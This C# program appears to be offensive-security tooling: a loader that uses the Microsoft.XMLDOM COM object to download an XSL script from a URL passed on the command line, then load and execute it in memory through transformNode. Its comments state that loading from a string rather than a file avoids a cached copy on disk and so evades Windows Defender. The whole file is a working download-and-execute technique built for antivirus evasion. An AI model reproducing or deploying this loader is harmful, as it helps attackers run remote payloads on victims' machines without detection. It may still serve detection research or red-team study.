using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace TryCOMXSLLoad
{
    class Program
    {
        static void Main(string[] args)
        {
            //Read script from file
            //string script = System.IO.File.ReadAllText(args[0]);

            Type comType = Type.GetTypeFromProgID("Microsoft.XMLDOM");

            Console.WriteLine("GUID: {0}", comType.GUID);
            Console.WriteLine("FullName: {0}", comType.FullName);
            Console.WriteLine("Name: {0}", comType.Name);

            object comObject = Activator.CreateInstance(comType);

            //Download the script from the URL specified by a command-line argument
            string script = new System.Net.WebClient().DownloadString(args[0]);

            string[] namedargs = { script };

            //Provide a URL/File location for the load function
            //string[] namedargs = { args[0] };
            
            //Set the async field to false
            comType.InvokeMember("async",
                BindingFlags.DeclaredOnly |
                BindingFlags.Public | BindingFlags.NonPublic |
                BindingFlags.Instance | BindingFlags.SetProperty | BindingFlags.SetField, null, comObject, new Object[] { false });

            //Load from file. Results in a temporary cache file on disk that Defender alerts on
            //comType.InvokeMember("load", BindingFlags.InvokeMethod, null, comObject, namedargs);

            object xsl = comObject;
            
            //Load from string. No file is cached, evading Defender.
            comType.InvokeMember("loadXML", BindingFlags.Static | BindingFlags.InvokeMethod, null, comObject, namedargs);


            //Transform the XSL file
            comType.InvokeMember("transformNode", BindingFlags.Static | BindingFlags.InvokeMethod, null, comObject, new Object[] { xsl });

            Console.Read();
        }
    }
}
